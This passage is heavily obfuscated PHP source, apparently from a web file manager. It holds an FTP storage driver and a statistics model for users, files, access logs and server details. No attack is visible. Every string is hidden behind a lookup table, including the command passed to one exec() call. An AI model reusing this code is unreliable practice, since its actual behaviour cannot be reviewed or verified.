size($¾¨Ú”Æâ) { $ïÅçûü = $this->objectMeta($¾¨Ú”Æâ); return $ïÅçûü ? $ïÅçûü[$_SERVER[ùèÅ´Ãš][79]] : 0; } public function info($„•¸ÉŞç) { if ($this->isFile($„•¸ÉŞç)) { return $this->fileInfo($„•¸ÉŞç, 0); } else { if ($this->isFolder($„•¸ÉŞç)) { return $this->folderInfo($„•¸ÉŞç); } } return !1; } private function fileList($²°îˆŸó, &$åÑÂÙ—µ, &$À–‘‹Š‘, $ì­‰”™„ = false) { $¢¿õ•´¢ =& $_SERVER[ùèÅ´Ãš]; $²°îˆŸó = $this->iconvSystem($²°îˆŸó); if (!$this->isFolder($²°îˆŸó)) { return !1; } $²°îˆŸó = rtrim($²°îˆŸó, $¢¿õ•´¢[8]) . $¢¿õ•´¢[8]; check_abort(); $ı •ú‡ƒ = @ftp_rawlist($this->connect, $²°îˆŸó); if (!$ı •ú‡ƒ) { $ı •ú‡ƒ = array(); } $ÃèØÅáŸ = array($¢¿õ•´¢[10] => 1, $¢¿õ•´¢[1377] => 1); foreach ($ı •ú‡ƒ as $¾Ò¯Ó¹Ÿ) { $Ä³àŒõ = $this->_listItem($¾Ò¯Ó¹Ÿ); if ($Ä³àŒõ[0] == $¢¿õ•´¢[836]) { continue; } $Ô¸ÅºÈÎ = $Ä³àŒõ[8]; if (empty($Ô¸ÅºÈÎ) && $Ô¸ÅºÈÎ !== $¢¿õ•´¢[231] || isset($ÃèØÅáŸ[$Ô¸ÅºÈÎ])) { continue; } $Ô¸ÅºÈÎ = $this->iconvApp($²°îˆŸó . ltrim($Ô¸ÅºÈÎ, $¢¿õ•´¢[8])); $ í¢òÓı = array($¢¿õ•´¢[32] => $Ô¸ÅºÈÎ, $¢¿õ•´¢[33] => $¢¿õ•´¢[233], $¢¿õ•´¢[79] => $Ä³àŒõ[4]); if (substr($¾Ò¯Ó¹Ÿ, 0, 1) == $¢¿õ•´¢[1473]) { $ í¢òÓı[$¢¿õ•´¢[33]] = $¢¿õ•´¢[78]; $ í¢òÓı[$¢¿õ•´¢[79]] = 0; } $óğşşûº = $ í¢òÓı[$¢¿õ•´¢[33]] == $¢¿õ•´¢[78] ? !0 : !1; $this->cacheMethodInfoSet($Ô¸ÅºÈÎ, $óğşşûº, $ í¢òÓı); if ($óğşşûº) { $åÑÂÙ—µ[] = $Ô¸ÅºÈÎ; if ($ì­‰”™„) { $this->fileList($Ô¸ÅºÈÎ, $åÑÂÙ—µ, $À–‘‹Š‘, $ì­‰”™„); } continue; } $À–‘‹Š‘[] = $ í¢òÓı; } $this->cacheMethodInfoSet($²°îˆŸó, !0); } private function _listItem($»š¹ÈïŞ) { if (empty($»š¹ÈïŞ)) { return array(); } $óÔ·˜“È = preg_split($_SERVER[ùèÅ´Ãš][1474], $»š¹ÈïŞ); if (count($óÔ·˜“È) <= 9) { return $óÔ·˜“È; } $óÔ·˜“È[8] = trim(substr($»š¹ÈïŞ, strpos($»š¹ÈïŞ, $óÔ·˜“È[7]) + strlen($óÔ·˜“È[7]))); return array_splice($óÔ·˜“È, 0, 9); } public function listPath($½»ÁßÌ‘, $î¼Û’Œ = false) { $‰¥°ŒÑ× =& $_SERVER[ùèÅ´Ãš]; if (!$this->_isconn()) { return !1; } $„¢Ö•Ş¶ = $áÉ´Âù¿ = array(); $this->fileList($½»ÁßÌ‘, $„¢Ö•Ş¶, $áÉ´Âù¿); foreach ($„¢Ö•Ş¶ as $‚ê•…„ => $ğ±Øä‰×) { $„¢Ö•Ş¶[$‚ê•…„] = $this->folderInfo($ğ±Øä‰×, $î¼Û’Œ); } foreach ($áÉ´Âù¿ as $‚ê•…„ => $ğ±Øä‰×) { $áÉ´Âù¿[$‚ê•…„] = $this->fileInfo($ğ±Øä‰×[$‰¥°ŒÑ×[32]], $î¼Û’Œ, $ğ±Øä‰×); } return array($‰¥°ŒÑ×[85] => $„¢Ö•Ş¶, $‰¥°ŒÑ×[86] => $áÉ´Âù¿); } public function has($×¸‚Òô, $åÊÒÔ²ã = false, $üğ¬ë´á = true) { $ÖÀ•„ñÜ =& $_SERVER[ùèÅ´Ãš]; $ÕŒœ›À = $îõÌíÇ = array(); $¢ÅÛªÄ = $åÊÒÔ²ã ? !0 : !1; $this->fileList($×¸‚Òô, $ÕŒœ›À, $îõÌíÇ, $¢ÅÛªÄ); if ($åÊÒÔ²ã) { return array($ÖÀ•„ñÜ[242] => count($îõÌíÇ), $ÖÀ•„ñÜ[243] => count($ÕŒœ›À)); } if ($üğ¬ë´á) { if (count($îõÌíÇ)) { return !0; } } else { if (count($ÕŒœ›À)) { return !0; } } return !1; } public function listAll($’ªÄ‘£½) { $½ôı§¥ =& $_SERVER[ùèÅ´Ãš]; if (!$this->_isconn()) { return !1; } $öˆà¿¢¨ = $†±ĞÆ¶… = array(); $this->fileList($’ªÄ‘£½, $öˆà¿¢¨, $†±ĞÆ¶…, !0); $èÕĞŸàÅ = array_to_keyvalue($†±ĞÆ¶…, $½ôı§¥[32]); foreach ($öˆà¿¢¨ as $¬Æö‰ûï) { if (is_string($¬Æö‰ûï)) { $èÕĞŸàÅ[$¬Æö‰ûï] = array($½ôı§¥[79] => 0); } } return $this->listAllFiles($’ªÄ‘£½, $èÕĞŸàÅ); } public function getContent($÷§‚¢Òç) { if (!$this->_isconn()) { return !1; } $÷§‚¢Òç = $this->iconvSystem($÷§‚¢Òç); return $this->fileSubstr($÷§‚¢Òç); } public function setContent($ÑÏ‹Â, $†¤ÏÊò = '') { if (!$this->_isconn()) { return !1; } $í½µìá = $this->pathThis($this->iconvSystem($ÑÏ‹Â)); $µÕ¨ÕÏÎ = $this->tempFile($í½µìá); file_put_contents($µÕ¨ÕÏÎ, $†¤ÏÊò); $ç°³Î„¹ = $this->upload($ÑÏ‹Â, $this->iconvApp($µÕ¨ÕÏÎ)); $this->tempFileRemve($µÕ¨ÕÏÎ); return $ç°³Î„¹; } public function fileSubstr($“ÒÛÄ½´, $Ë°ÛñÙò = 0, $¤¹¡î¿© = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($“ÒÛÄ½´, $Ë°ÛñÙò, $¤¹¡î¿©); } private function ftpRequest($ÙæÊÇ¿Ä, $¿Õæ‰È = 0, $–Üœœ¶ƒ = false) { $·”†‰¦ =& $_SERVER[ùèÅ´Ãš]; $ÙæÊÇ¿Ä = $·”†‰¦[8] . ltrim(str_ltrim($ÙæÊÇ¿Ä, $this->ftpPath), $·”†‰¦[8]); $ÙæÊÇ¿Ä = $this->iconvSystem($ÙæÊÇ¿Ä); $îí‹»¿¼ = $this->scheme . $this->host . $·”†‰¦[4] . $this->port; $Àì³­â = curl_init(); curl_setopt($Àì³­â, CURLOPT_URL, $îí‹»¿¼ . $this->pathEncode($ÙæÊÇ¿Ä)); curl_setopt($Àì³­â, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($–Üœœ¶ƒ) { $–·˜ôÁ = $¿Õæ‰È + $–Üœœ¶ƒ - 1; curl_setopt($Àì³­â, CURLOPT_RANGE, "{$¿Õæ‰È}\x2d{$–·˜ôÁ}"); } curl_setopt($Àì³­â, CURLOPT_RETURNTRANSFER, 1); $¬À’ŠÀ = curl_exec($Àì³­â); curl_close($Àì³­â); return $¬À’ŠÀ; } public function upload($ÂŸŠ·ı, $›óĞ§Ñ‚, $ßêÍŞ¹ = false, $“ÓÑÉÂö = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($ÂŸŠ·ı))) { return !1; } $ÂŸŠ·ı = $this->iconvSystem($ÂŸŠ·ı); $›óĞ§Ñ‚ = $this->iconvSystem($›óĞ§Ñ‚); $œğò†šø = ftp_nb_put($this->connect, $ÂŸŠ·ı, $›óĞ§Ñ‚, FTP_BINARY); while ($œğò†šø == FTP_MOREDATA) { $œğò†šø = ftp_nb_continue($this->connect); } if ($œğò†šø != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[ùèÅ´Ãš][1472], !0); return !1; } return $this->getPathOuter($ÂŸŠ·ı); } public function download($ÜÑñÎ§, $š¥ºù«€ = '') { if (!$this->_isconn()) { return !1; } $»Ğ¶ˆåÎ = $this->pathFather($š¥ºù«€); if (!IO::mkdir($»Ğ¶ˆåÎ)) { return !1; } $ÜÑñÎ§ = $this->iconvSystem($ÜÑñÎ§); $š¥ºù«€ = $this->iconvSystem($š¥ºù«€); $ÎËœÚ… = ftp_nb_get($this->connect, $š¥ºù«€, $ÜÑñÎ§, FTP_BINARY); while ($ÎËœÚ… == FTP_MOREDATA) { $ÎËœÚ… = ftp_nb_continue($this->connect); } if ($ÎËœÚ… != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[ùèÅ´Ãš][1472], !0); return !1; } return $this->iconvApp($š¥ºù«€); } public function exist($Ò¿‚×ñ) { return $this->isFile($Ò¿‚×ñ) || $this->isFolder($Ò¿‚×ñ); } public function isFile($›òŠ¸‡£) { return !$this->isFolder($›òŠ¸‡£) && $this->objectMeta($›òŠ¸‡£); } public function isFolder($’ÇÕŞí°) { return $this->cacheMethod($_SERVER[ùèÅ´Ãš][180], $’ÇÕŞí°); } protected function objectMeta($Åøù•Æ½) { return $this->cacheMethod($_SERVER[ùèÅ´Ãš][182], $Åøù•Æ½); } protected function _objectMeta($°„‹Œ ) { $ä®³¨Ø =& $_SERVER[ùèÅ´Ãš]; if ($°„‹Œ  == $ä®³¨Ø[12] || $°„‹Œ  == $ä®³¨Ø[8]) { return array(); } if (!$this->_isconn()) { return !1; } $°„‹Œ  = $this->iconvSystem($°„‹Œ ); $˜´‰ò×î = array($ä®³¨Ø[32] => $this->iconvApp($°„‹Œ ), $ä®³¨Ø[33] => $ä®³¨Ø[233], $ä®³¨Ø[79] => 0); $Ÿ—²—ÀÎ = @ftp_size($this->connect, $°„‹Œ ); if ($Ÿ—²—ÀÎ != -1) { $˜´‰ò×î[$ä®³¨Ø[79]] = $Ÿ—²—ÀÎ; } else { $œª½ìãË = @ftp_chdir($this->connect, $°„‹Œ ); if (!$œª½ìãË) { return !1; } @ftp_chdir($this->connect, $ä®³¨Ø[8]); $˜´‰ò×î[$ä®³¨Ø[33]] = $ä®³¨Ø[78]; } return $˜´‰ò×î; } protected function _isFolder($º×ØÚª¸) { $”ªúÑ© =& $_SERVER[ùèÅ´Ãš]; if ($º×ØÚª¸ == $”ªúÑ©[12] || $º×ØÚª¸ == $”ªúÑ©[8]) { return !0; } $ï‰¿óÈ× = $this->_objectMeta($º×ØÚª¸); return isset($ï‰¿óÈ×[$”ªúÑ©[33]]) && $ï‰¿óÈ×[$”ªúÑ©[33]] == $”ªúÑ©[78] ? !0 : !1; } } goto d‘Ùš™ƒÀ; eöÔº±ëøå: class AnalysisModel extends ModelBaseLight { public function init($ÌşŒ…ö°) { $Ğ…¬¶çÄ =& $_SERVER[ùèÅ´Ãš]; $¥ÒÒÙ = array($Ğ…¬¶çÄ[669] => array($Ğ…¬¶çÄ[33] => $Ğ…¬¶çÄ[1927], $Ğ…¬¶çÄ[353] => array($Ğ…¬¶çÄ[285], $Ğ…¬¶çÄ[843], $Ğ…¬¶çÄ[1928], $Ğ…¬¶çÄ[1929])), $Ğ…¬¶çÄ[1930] => array($Ğ…¬¶çÄ[33] => $Ğ…¬¶çÄ[1931], $Ğ…¬¶çÄ[353] => array($Ğ…¬¶çÄ[285], $Ğ…¬¶çÄ[841], $Ğ…¬¶çÄ[1932], $Ğ…¬¶çÄ[1933], $Ğ…¬¶çÄ[1934]))); if (!isset($¥ÒÒÙ[$ÌşŒ…ö°])) { return !1; } $this->optionType = $¥ÒÒÙ[$ÌşŒ…ö°][$Ğ…¬¶çÄ[33]]; $this->field = $¥ÒÒÙ[$ÌşŒ…ö°][$Ğ…¬¶çÄ[353]]; return !0; } public function listData($Èø‰Êó = false, $ÛÀ«Ğã– = "\155\x6f\x64\151\x66\171\x54\151\155\x65", $òÈĞÛ‰À = false) { return parent::listData($Èø‰Êó, $ÛÀ«Ğã–, $òÈĞÛ‰À); } public function trendList($‡ÅŠ¼øñ) { $§×½¸Ú =& $_SERVER[ùèÅ´Ãš]; $ÙÀ¥ ¯Å = $this->listData(); if ($ÙÀ¥ ¯Å) { $÷—²‘è“ = end($ÙÀ¥ ¯Å); $îäü™¼– = date($§×½¸Ú[1935], strtotime($§×½¸Ú[1936])); if ($÷—²‘è“[$§×½¸Ú[285]] == $îäü™¼–) { return $ÙÀ¥ ¯Å; } $¹‰ñÃ‰Å = strtotime($÷—²‘è“[$§×½¸Ú[285]]); } if (!isset($¹‰ñÃ‰Å)) { $öå ”‡Œ = $‡ÅŠ¼øñ == $§×½¸Ú[669] ? $§×½¸Ú[601] : $§×½¸Ú[908]; $¹‰ñÃ‰Å = Model($öå ”‡Œ)->min($§×½¸Ú[234]); } $º³µøÄª = $§×½¸Ú[1937] . ucfirst($‡ÅŠ¼øñ); $Ñ÷­«‹ñ = $this->dateList($¹‰ñÃ‰Å); foreach ($Ñ÷­«‹ñ as $îäü™¼–) { $this->{$º³µøÄª}($îäü™¼–); } return $this->listData(); } private function dateList($Ó¬Øšñá) { $æ§ÛÈî¾ =& $_SERVER[ùèÅ´Ãš]; $îÈ¹´ƒš = $Ó¬Øšñá; $¿±¨Áâ = strtotime($æ§ÛÈî¾[1936]); $‡¶Ë€÷ = array(); while ($îÈ¹´ƒš <= $¿±¨Áâ) { $‡¶Ë€÷[] = date($æ§ÛÈî¾[1935], $îÈ¹´ƒš); $îÈ¹´ƒš = strtotime($æ§ÛÈî¾[1938], $îÈ¹´ƒš); } return $‡¶Ë€÷; } public function _recordUser($Ã¿Ÿºë´ = '') { $úû•Êƒî =& $_SERVER[ùèÅ´Ãš]; $Ï¶û¦á² = strtotime(date($úû•Êƒî[1939], strtotime($Ã¿Ÿºë´))); $§€¤ûŸ = strtotime(date($úû•Êƒî[1940], strtotime($Ã¿Ÿºë´))); $ºáâ®¤ = array($úû•Êƒî[234] => array($úû•Êƒî[1101], $§€¤ûŸ)); $Õ™Àİ”¶ = Model($úû•Êƒî[601])->where($ºáâ®¤)->count($úû•Êƒî[1797]); $ºáâ®¤[$úû•Êƒî[234]] = array($úû•Êƒî[410], array($Ï¶û¦á², $§€¤ûŸ)); $ÎøŞ‰µ€ = Model($úû•Êƒî[601])->where($ºáâ®¤)->count($úû•Êƒî[1797]); $ºáâ®¤[$úû•Êƒî[33]] = $úû•Êƒî[1941]; $Î°á…‹” = Model($úû•Êƒî[1942])->where($ºáâ®¤)->count($úû•Êƒî[1943]); $® Ì…® = array($úû•Êƒî[285] => $Ã¿Ÿºë´, $úû•Êƒî[843] => (int) $Õ™Àİ”¶, $úû•Êƒî[1928] => (int) $ÎøŞ‰µ€, $úû•Êƒî[1929] => (int) $Î°á…‹”); return $this->insert($® Ì…®); } public function _recordStore($Ã¡üç’Ê = '') { $ÍÃ‹”ûË =& $_SERVER[ùèÅ´Ãš]; $™Û®Âù¯ = strtotime(date($ÍÃ‹”ûË[1940], strtotime($Ã¡üç’Ê))); $Ì´¢©—½ = array($ÍÃ‹”ûË[234] => array($ÍÃ‹”ûË[1101], $™Û®Âù¯)); $ŠŠİ´×× = Model($ÍÃ‹”ûË[548])->where($Ì´¢©—½)->sum($ÍÃ‹”ûË[79]); $Ì´¢©—½[$ÍÃ‹”ûË[487]] = 0; $æ¨Õ¸©– = Model($ÍÃ‹”ûË[908])->where($Ì´¢©—½)->sum($ÍÃ‹”ûË[79]); $Ì´¢©—½[$ÍÃ‹”ûË[191]] = 1; $‹‹Ú†ù› = Model($ÍÃ‹”ûË[908])->where($Ì´¢©—½)->sum($ÍÃ‹”ûË[79]); $Ì´¢©—½[$ÍÃ‹”ûË[191]] = 2; $¿’‘† = Model($ÍÃ‹”ûË[908])->where($Ì´¢©—½)->sum($ÍÃ‹”ûË[79]); $„¹¼…Àó = array($ÍÃ‹”ûË[285] => $Ã¡üç’Ê, $ÍÃ‹”ûË[841] => (int) $æ¨Õ¸©–, $ÍÃ‹”ûË[1932] => (int) $ŠŠİ´××, $ÍÃ‹”ûË[1933] => (int) $‹‹Ú†ù›, $ÍÃ‹”ûË[1934] => (int) $¿’‘†); return $this->insert($„¹¼…Àó); } public function trend($İ£¬ÊÄİ, $ŸÈ†›÷ü) { $¡Á”ØŒÏ =& $_SERVER[ùèÅ´Ãš]; if (!$this->init($İ£¬ÊÄİ)) { return !1; } $ü¿·ÛŒå = $this->trendList($İ£¬ÊÄİ); if ($ü¿·ÛŒå && $ŸÈ†›÷ü != $¡Á”ØŒÏ[1769]) { $íå«×Š = $ü¿·ÛŒå[0][$¡Á”ØŒÏ[285]]; $›šõà ã = $this->validDate($ŸÈ†›÷ü, $íå«×Š); $Åº±ñ« = array(); $ÙÆğÎÏ— = array_to_keyvalue($ü¿·ÛŒå, $¡Á”ØŒÏ[285]); foreach ($›šõà ã as $ùÜ„Â’) { if (isset($ÙÆğÎÏ—[$ùÜ„Â’])) { $éîŠÉ¾å = $ÙÆğÎÏ—[$ùÜ„Â’]; } else { $éîŠÉ¾å = end($ü¿·ÛŒå); $éîŠÉ¾å[$¡Á”ØŒÏ[285]] = $ùÜ„Â’; if ($İ£¬ÊÄİ == $¡Á”ØŒÏ[669]) { $éîŠÉ¾å[$¡Á”ØŒÏ[1928]] = $éîŠÉ¾å[$¡Á”ØŒÏ[1929]] = 0; } } $Åº±ñ«[] = $éîŠÉ¾å; } $ü¿·ÛŒå = $Åº±ñ«; } $¬ì×Ãô = array($¡Á”ØŒÏ[669] => array($¡Á”ØŒÏ[843] => LNG($¡Á”ØŒÏ[1944]), $¡Á”ØŒÏ[1928] => LNG($¡Á”ØŒÏ[1945]), $¡Á”ØŒÏ[1929] => LNG($¡Á”ØŒÏ[1946])), $¡Á”ØŒÏ[1930] => array($¡Á”ØŒÏ[841] => LNG($¡Á”ØŒÏ[1947]), $¡Á”ØŒÏ[1932] => LNG($¡Á”ØŒÏ[1948]), $¡Á”ØŒÏ[1933] => LNG($¡Á”ØŒÏ[1949]), $¡Á”ØŒÏ[1934] => LNG($¡Á”ØŒÏ[1950]))); $¾ƒ“Â = array($¡Á”ØŒÏ[669] => $¡Á”ØŒÏ[1951], $¡Á”ØŒÏ[1930] => $¡Á”ØŒÏ[79]); if (empty($ü¿·ÛŒå)) { $ùÜ„Â’ = date($¡Á”ØŒÏ[1935], strtotime($¡Á”ØŒÏ[1936])); $Âß¨º‹ë = array($¡Á”ØŒÏ[285] => $ùÜ„Â’); foreach ($¬ì×Ãô[$İ£¬ÊÄİ] as $‰²’Œ³ => $ã–º¦ÑŠ) { $Âß¨º‹ë[$‰²’Œ³] = 0; } $ü¿·ÛŒå[] = $Âß¨º‹ë; } $£”Ô÷ø = array(); foreach ($ü¿·ÛŒå as $ã–º¦ÑŠ) { if ($İ£¬ÊÄİ == $¡Á”ØŒÏ[1930] && $ã–º¦ÑŠ[$¡Á”ØŒÏ[1932]] > $ã–º¦ÑŠ[$¡Á”ØŒÏ[841]]) { $ã–º¦ÑŠ[$¡Á”ØŒÏ[1932]] = $ã–º¦ÑŠ[$¡Á”ØŒÏ[841]]; } foreach ($¬ì×Ãô[$İ£¬ÊÄİ] as $‰²’Œ³ => $¬ÔËƒ¦­) { $éîŠÉ¾å = array($¡Á”ØŒÏ[285] => $ã–º¦ÑŠ[$¡Á”ØŒÏ[285]], $¡Á”ØŒÏ[1683] => $¬ÔËƒ¦­); $éîŠÉ¾å[$¾ƒ“Â[$İ£¬ÊÄİ]] = isset($ã–º¦ÑŠ[$‰²’Œ³]) ? $ã–º¦ÑŠ[$‰²’Œ³] : 0; $£”Ô÷ø[] = $éîŠÉ¾å; } } return $£”Ô÷ø; } public function validDate($ò®™”óœ, $‘ÚÄº¾) { $»»÷Ş†… =& $_SERVER[ùèÅ´Ãš]; $¤õŒÒ• = date($»»÷Ş†…[1935], strtotime($»»÷Ş†…[1936])); $ÁÇÍÔÌÀ = array($¤õŒÒ•); switch ($ò®™”óœ) { case $»»÷Ş†…[1776]: $Ãƒşö  = mktime(0, 0, 0, date($»»÷Ş†…[1952]), date($»»÷Ş†…[1473]) - date($»»÷Ş†…[1562]) + 7 - 7, date($»»÷Ş†…[1953])); $ãÇ”ºúÓ = 0; do { $¤ôÑ±ƒç = date($»»÷Ş†…[1935], $Ãƒşö  - 3600 * 24 * 7 * $ãÇ”ºúÓ); $ÁÇÍÔÌÀ[] = $¤ôÑ±ƒç; $ãÇ”ºúÓ++; } while ($‘ÚÄº¾ < $¤ôÑ±ƒç); break; case $»»÷Ş†…[1774]: $ãÇ”ºúÓ = 1; do { $Øó²êš = date($»»÷Ş†…[1954], strtotime("\55\40{$ãÇ”ºúÓ}\40\x6d\157\156\x74\150\163")); $ÁÇÍÔÌÀ[] = $Øó²êš; $ãÇ”ºúÓ++; } while ($‘ÚÄº¾ < $Øó²êš); break; case $»»÷Ş†…[1955]: $¼¤‡Şİå = (int) date($»»÷Ş†…[1953], strtotime($‘ÚÄº¾)); $ëçÅ«ìÁ = (int) date($»»÷Ş†…[1953]); if ($¼¤‡Şİå >= $ëçÅ«ìÁ) { break; } for ($¼¤‡Şİå; $¼¤‡Şİå < $ëçÅ«ìÁ; $¼¤‡Şİå++) { $ÁÇÍÔÌÀ[] = $¼¤‡Şİå . $»»÷Ş†…[1956]; } break; default: break; } if ($‘ÚÄº¾ > end($ÁÇÍÔÌÀ)) { array_pop($ÁÇÍÔÌÀ); } sort($ÁÇÍÔÌÀ); return $ÁÇÍÔÌÀ; } public function listTable($ç×¥¡­) { $Å‰¨»¼ = ucfirst($ç×¥¡­); return Model($Å‰¨»¼)->listData(); } public function option($àÌ»×ÆÀ) { $Ò´ÃÕÛ· = $_SERVER[ùèÅ´Ãš][1957] . ucfirst($àÌ»×ÆÀ); return $this->{$Ò´ÃÕÛ·}(); } private function optionUser() { $®Õ¯€¾¢ =& $_SERVER[ùèÅ´Ãš]; $È¹Ìãå = Model($®Õ¯€¾¢[601])->count($®Õ¯€¾¢[1797]); $ÆÌ›¸“î = Model($®Õ¯€¾¢[601])->where($®Õ¯€¾¢[1958])->count($®Õ¯€¾¢[1797]); $ïµÑÆê = intval($GLOBALS[$®Õ¯€¾¢[6]][$®Õ¯€¾¢[426]][$®Õ¯€¾¢[1742]]) / 3600; $ŞĞÏ¡Ğ = strtotime("\x2d{$ïµÑÆê}\40\150\x6f\x75\162\163"); $ÀÂÜ‰¸’ = strtotime(date($®Õ¯€¾¢[1939])); if ($ŞĞÏ¡Ğ < $ÀÂÜ‰¸’) { $ŞĞÏ¡Ğ = $ÀÂÜ‰¸’; } $é£Ï‰û¬ = array($®Õ¯€¾¢[1959] => array($®Õ¯€¾¢[1102], $ŞĞÏ¡Ğ)); $¤ÖèìúĞ = (int) Model($®Õ¯€¾¢[601])->where($é£Ï‰û¬)->count($®Õ¯€¾¢[1797]); if (!$¤ÖèìúĞ) { $¤ÖèìúĞ = 1; } $é£Ï‰û¬ = array($®Õ¯€¾¢[1959] => array($®Õ¯€¾¢[1102], $ÀÂÜ‰¸’)); $—¹§şçŠ = Model($®Õ¯€¾¢[601])->where($é£Ï‰û¬)->count($®Õ¯€¾¢[1797]); return array($®Õ¯€¾¢[836] => (int) $È¹Ìãå, $®Õ¯€¾¢[1960] => (int) ($È¹Ìãå - $ÆÌ›¸“î), $®Õ¯€¾¢[1961] => (int) $ÆÌ›¸“î, $®Õ¯€¾¢[1962] => (int) $—¹§şçŠ, $®Õ¯€¾¢[1963] => $¤ÖèìúĞ); } private function optionFile() { $ÁÂ˜ù‹è =& $_SERVER[ùèÅ´Ãš]; $·Â®áËí = $this->sourceSize(); $ëÍ¦¼úÅ = $·Â®áËí[$ÁÂ˜ù‹è[79]]; $Ççğ×Ğà = $·Â®áËí[$ÁÂ˜ù‹è[1932]]; $³¨–§¶Û = Model($ÁÂ˜ù‹è[908])->where(array($ÁÂ˜ù‹è[487] => 0))->count($ÁÂ˜ù‹è[194]); $†Æ“á›Â = array($ÁÂ˜ù‹è[487] => 0, $ÁÂ˜ù‹è[234] => array($ÁÂ˜ù‹è[1102], strtotime(date($ÁÂ˜ù‹è[1939])))); $‚æåÎ±ğ = Model($ÁÂ˜ù‹è[908])->where($†Æ“á›Â)->sum($ÁÂ˜ù‹è[79]); $û¯ò±®Ğ = Model($ÁÂ˜ù‹è[908])->where($†Æ“á›Â)->count($ÁÂ˜ù‹è[194]); return array($ÁÂ˜ù‹è[841] => $ëÍ¦¼úÅ, $ÁÂ˜ù‹è[1932] => $Ççğ×Ğà, $ÁÂ˜ù‹è[1964] => $ëÍ¦¼úÅ - $Ççğ×Ğà, $ÁÂ˜ù‹è[1965] => (int) $‚æåÎ±ğ, $ÁÂ˜ù‹è[843] => (int) $³¨–§¶Û, $ÁÂ˜ù‹è[1966] => (int) $û¯ò±®Ğ); } private function optionAccess() { $îëÁ£Õé =& $_SERVER[ùèÅ´Ãš]; return array($îëÁ£Õé[836] => $this->typeLogCnt(), $îëÁ£Õé[110] => $this->typeLogCnt($îëÁ£Õé[110]), $îëÁ£Õé[527] => $this->typeLogCnt($îëÁ£Õé[527]), $îëÁ£Õé[1241] => $this->typeLogCnt($îëÁ£Õé[1241]), $îëÁ£Õé[1967] => $this->typeLogCnt($îëÁ£Õé[1967]), $îëÁ£Õé[669] => $this->typeLogCnt($îëÁ£Õé[12], $îëÁ£Õé[1943])); } private function typeLogCnt($‡Ò“Â…¬ = '', $‚Äë—Ø½ = "\151\144") { $ıüø²Ôò =& $_SERVER[ùèÅ´Ãš]; $ƒ¾“õÆ = array($ıüø²Ôò[110] => array($ıüø²Ôò[1968], $ıüø²Ôò[1969]), $ıüø²Ôò[527] => array($ıüø²Ôò[1970], $ıüø²Ôò[1971]), $ıüø²Ôò[1241] => array($ıüø²Ôò[1972], $ıüø²Ôò[1973], $ıüø²Ôò[1974]), $ıüø²Ôò[1967] => array($ıüø²Ôò[1975], $ıüø²Ôò[1976]), $ıüø²Ôò[1977] => array($ıüø²Ôò[1978], $ıüø²Ôò[1979], $ıüø²Ôò[1980])); $¶“äÉ = strtotime(date($ıüø²Ôò[1939])); $£Íßí = array($ıüø²Ôò[234] => array($ıüø²Ôò[1102], $¶“äÉ)); if ($‡Ò“Â…¬) { $£Íßí[$ıüø²Ôò[33]] = array($ıüø²Ôò[7], $ƒ¾“õÆ[$‡Ò“Â…¬]); } $ıÏ²ìÕ½ = Model($ıüø²Ôò[1942])->where($£Íßí)->count($‚Äë—Ø½); return (int) $ıÏ²ìÕ½; } private function optionServer() { $ ÃÜ»õ =& $_SERVER[ùèÅ´Ãš]; $ÎìÛÂ  = $this->diskDriver(); $âı±ˆ©ü = KodIO::defaultDriver(); $¶‡‘†úè = array($ ÃÜ»õ[901] => $âı±ˆ©ü[$ ÃÜ»õ[477]]); $îƒç¿§Ì = Model($ ÃÜ»õ[548])->where($¶‡‘†úè)->sum($ ÃÜ»õ[79]); $®ˆ†â£ = explode($ ÃÜ»õ[53], $_SERVER[$ ÃÜ»õ[147]]); $şÁÇŸö‰ = $®ˆ†â£[0]; $½–ƒŠôÀ = $GLOBALS[$ ÃÜ»õ[6]][$ ÃÜ»õ[21]]; $³ê£¨¨ = $½–ƒŠôÀ[$ ÃÜ»õ[1064]]; if ($³ê£¨¨ == $ ÃÜ»õ[1052]) { $¬¼±‰Àî = explode($ ÃÜ»õ[1382], $½–ƒŠôÀ[$ ÃÜ»õ[1063]]); $³ê£¨¨ = $¬¼±‰Àî[0]; } if ($³ê£¨¨ == $ ÃÜ»õ[1000] || $³ê£¨¨ == $ ÃÜ»õ[886]) { $ç¾±ıïç = Model()->db()->query($ ÃÜ»õ[1981]); $˜­˜äÜ = $ç¾±ıïç[0] && isset($ç¾±ıïç[0][$ ÃÜ»õ[1682]]) ? $ç¾±ıïç[0][$ ÃÜ»õ[1682]] : 0; $³ê£¨¨ = $ ÃÜ»õ[1982] . ($˜­˜äÜ ? $ ÃÜ»õ[8] . $˜­˜äÜ : $ ÃÜ»õ[12]); } $§÷‚¡• = $GLOBALS[$ ÃÜ»õ[6]][$ ÃÜ»õ[426]][$ ÃÜ»õ[910]]; return array($ ÃÜ»õ[1983] => $ÎìÛÂ  ? $ÎìÛÂ [$ ÃÜ»õ[1984]] : 0, $ ÃÜ»õ[1985] => $ÎìÛÂ  ? $ÎìÛÂ [$ ÃÜ»õ[1986]] : 0, $ ÃÜ»õ[1987] => (int) $âı±ˆ©ü[$ ÃÜ»õ[1984]] * 1024 * 1024 * 1024, $ ÃÜ»õ[1988] => (int) $îƒç¿§Ì, $ ÃÜ»õ[1989] => ucfirst($şÁÇŸö‰), $ ÃÜ»õ[1990] => $ ÃÜ»õ[1991] . PHP_VERSION, $ ÃÜ»õ[1992] => phpBuild64() ? 64 : 32, $ ÃÜ»õ[835] => str_replace($ ÃÜ»õ[1220], $ ÃÜ»õ[1080], $³ê£¨¨), $ ÃÜ»õ[426] => ucfirst($§÷‚¡•), $ ÃÜ»õ[32] => $_SERVER[$ ÃÜ»õ[1993]]); } private function diskDriver() { $ºµ‡§ =& $_SERVER[ùèÅ´Ãš]; $˜†’ìÍ• = $ºµ‡§[8]; $–¸¤Ï¦„ = $GLOBALS[$ºµ‡§[6]][$ºµ‡§[1406]] == $ºµ‡§[1407]; if ($–¸¤Ï¦„) { $˜†’ìÍ• = $ºµ‡§[1994]; if (function_exists($ºµ‡§[1995])) { exec($ºµ‡§[1996], $ôÛõ•¸·); $˜†’ìÍ• = $ôÛõ•¸·[1] . $ºµ‡§[8]; } } if (!file_exists($˜†’ìÍ•)) { return; } if (!function_exists($ºµ‡§[1997])) { return; } $ùÏô¡”€ = @disk_total_space($˜†’ìÍ•); $Ş¸€í»í = 